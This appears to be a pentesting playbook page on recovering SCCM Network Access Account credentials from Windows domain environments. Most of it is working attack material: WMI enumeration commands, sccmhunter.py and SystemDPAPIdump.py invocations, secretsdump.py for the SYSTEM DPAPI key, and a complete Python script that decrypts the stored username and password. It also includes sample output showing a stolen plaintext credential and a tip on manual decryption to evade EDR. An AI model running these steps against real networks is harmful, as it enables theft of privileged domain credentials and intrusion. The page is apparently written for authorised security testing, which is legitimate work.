**SCCM Network Access Account (NAA)** — the NAA lets non-domain-joined machines download SCCM packages. Its cleartext credentials are pushed to domain-joined machines too, protected by DPAPI under the `SYSTEM` account's user key. Recover them for a set of often-privileged domain credentials.

**Note:** Microsoft now recommends Enhanced HTTP instead of an NAA, but many environments still have one.

## Discovery

### Enumerate SCCM servers

See the SCCM section of [Tier Zero Server Isolation](../Reconnaissance/Tier%20Zero%20Server%20Isolation.md).

### Enumerate NAA credentials locally (WMI, as admin)

```powershell

Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

```

If an NAA exists you get encrypted blobs (otherwise an exception):

```txt

NetworkAccessPassword : <PolicySecret Version="1"><![CDATA[06010000...DF046320]]></PolicySecret>
NetworkAccessUsername : <PolicySecret Version="1"><![CDATA[06010000...9650B609]]></PolicySecret>

```

## Exploitation

Several ways to recover cleartext NAA credentials, depending on your access.

### Remotely with a domain computer account

Requires a computer account (see [Computer Account Creation](../Reconnaissance/Computer%20Account%20Creation%20%28MAQ%29.md)). `sccmhunter.py` needs the cleartext password (NT-hash auth not supported yet).

```bash

python3 sccmhunter.py http -d 'DOMAIN' -dc-ip 'DC_IP' -cn 'COMPUTER_NAME$' -cp 'COMPUTER_PASS'

```

### Remotely with an NTLM relay

See [NTLM Relay to SCCM](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay%20to%20SCCM.md).

### Remotely with a domain user account

Requires a user that can create a computer account. The `-auto` method creates a random-named computer account (poor traceability - prefer the computer-account method above).

```bash

python3 sccmhunter.py http -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN' -dc-ip 'DC_IP' -auto

```

```console

[+] Found http://sccm.domain.local/ccm_system_windowsauth
[+] DESKTOP-61A3O8MW$ created with password: 5s7BRX6czcvs
[*] Attempting to grab policy from sccm.domain.local
[+] Got NAA credential: DOMAIN\sccmnaa:eePha8Thaeru
[+] Done.. decrypted policy dumped to sccm_naapolicy.xml

```

**Warning:** Delete the created computer account afterwards (see [Computer Account Creation](../Reconnaissance/Computer%20Account%20Creation%20%28MAQ%29.md)) or note it in the report. Devices are also created in the SCCM database - remove them with `SharpSCCM` and a privileged SCCM account, or list them in the report.

### Remotely with an admin account

`SystemDPAPIdump.py` automates the whole thing (works like `secretsdump.py`, so it accepts NT hash or Kerberos too):

```bash

git clone -b 'pr_SystemDPAPIdump' 'https://github.com/clavoillotte/impacket' 'impacket-SystemDPAPIdump'
python3 ./impacket-SystemDPAPIdump/examples/SystemDPAPIdump.py -sccm 'DOMAIN/ADM_NAME:ADM_PASS@TARGET'

```

### Locally with admin / SYSTEM privileges (manual)

If you want to avoid the automated tool (e.g. for EDR evasion), decrypt the blobs manually. You need four things: the `NetworkAccessUsername` blob, the `NetworkAccessPassword` blob, the DPAPI **user key** of the `SYSTEM` account, and the master key file that protects the blobs.

Decryption script:

```python

import sys
from binascii import unhexlify, hexlify
from impacket.dpapi import DPAPI_BLOB, MasterKeyFile, MasterKey
from impacket.uuid import bin_to_string

network_access_username = """<PolicySecret Version="1"><![CDATA[160100000...B8F5137AC376A1]]></PolicySecret>"""
network_access_password = """<PolicySecret Version="1"><![CDATA[F60000000...10902D448A9F3E]]></PolicySecret>"""
dpapi_userkey = "00bed1ba...debd90fd6b7b7d3a3"
sccm_master_key_file = ""  # e.g. ./loot/6d27fdb0-2c1f-45a6-8767-804b70691494

def get_dpapi_key_id(raw_data):
    blob = DPAPI_BLOB(raw_data)
    return bin_to_string(blob['GuidMasterKey'])

def decrypt_blob(raw_data, key):
    blob = DPAPI_BLOB(raw_data)
    return blob.decrypt(key).decode('utf-16le')

def main():
    username_bin = unhexlify(network_access_username[43:-18])
    password_bin = unhexlify(network_access_password[43:-18])
    print("DPAPI key ID: " + get_dpapi_key_id(username_bin))
    if not sccm_master_key_file:
        print("No master key file provided, exiting...")
        sys.exit(1)
    key = unhexlify(dpapi_userkey)
    with open(sccm_master_key_file, 'rb') as f:
        mkd = f.read()
    mkf = MasterKeyFile(mkd)
    mkd = mkd[len(mkf):]
    mk = MasterKey(mkd[:mkf['MasterKeyLen']])
    decryptedKey = mk.decrypt(key)
    print("Decrypted masterkey: 0x" + hexlify(decryptedKey).decode('utf-8'))
    print("Username: " + decrypt_blob(username_bin, decryptedKey))
    print("Password: " + decrypt_blob(password_bin, decryptedKey))

if __name__ == '__main__':
    main()

```

1. Dump LSA secrets to get the SYSTEM account's DPAPI user key (see [Dump Windows Registry](../Credential%20Dumping/Dump%20Windows%20Registry%20%28SAM-LSA%29.md)).

```bash

secretsdump.py -system 'SYSTEM_FILE' -security 'SECURITY_FILE' LOCAL
# ... dpapi_userkey:0x00bed1ba...debd90fd6b7b7d3a3

```

2. Retrieve the NAA username/password blobs (include the full `<PolicySecret>` tags).

```powershell

(Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class "CCM_NetworkAccessAccount" | select NetworkAccessUsername).NetworkAccessUsername
(Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class "CCM_NetworkAccessAccount" | select NetworkAccessPassword).NetworkAccessPassword

```

3. Run the script with the two blobs filled in to get the master key file ID (a GUID).

```console

$ python3 dpapi_sccm.py
DPAPI key ID: 6D27FDB0-2C1F-45A6-8767-804B70691494
No master key file provided, exiting...

```

4. Download the master key file from `C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\DPAPI_KEY_ID` (files are hidden - use `ls -Force`).

5. Fill `dpapi_userkey` and `sccm_master_key_file` in the script and run it again to print the decrypted username and password.

## Caution

`SystemDPAPIdump.py` behaves like `secretsdump.py`, so most EDRs will flag it.

## References

- SystemDPAPIdump.py (Impacket PR) - https://github.com/fortra/impacket/pull/1137
- sccmhunter.py - https://github.com/garrettfoster13/sccmhunter
- SharpSCCM - https://github.com/Mayyhem/SharpSCCM/wiki
- SpecterOps - The Phantom Credentials of SCCM - https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
